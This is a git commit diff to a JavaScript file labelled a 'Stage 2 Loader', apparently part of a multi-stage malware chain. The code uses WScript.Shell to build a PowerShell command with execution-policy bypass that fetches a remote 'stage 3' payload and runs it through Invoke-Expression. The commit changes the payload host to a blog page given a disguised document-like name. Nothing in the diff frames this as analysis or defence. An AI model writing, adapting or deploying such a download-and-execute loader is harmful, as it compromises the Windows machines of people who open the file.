ce5dabd02880de908fb1e1420bbf633ac5008f5b
slnarefile <d.gallego1001@gmail.com>
2026-05-02 10:56:46 +0500

    Update loader.js

--- loader.js
+++ loader.js
@@ -1,7 +1,7 @@
 // Final Fixed Stage 2 Loader
 var wsh = new ActiveXObject("WScript.Shell");
 
-var stage3Url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_0888cee577f74e7f858d74ff29d7462e.txt";
+var stage3Url = "https://aprilcap.blogspot.com/2026/04/chut.docx.pdf.html";
 
 var cmd = '-ep Bypass -c "Invoke-Expression (Invoke-WebRequest -Uri \'' + stage3Url + '\' -UseBasicParsing).Content"';
 
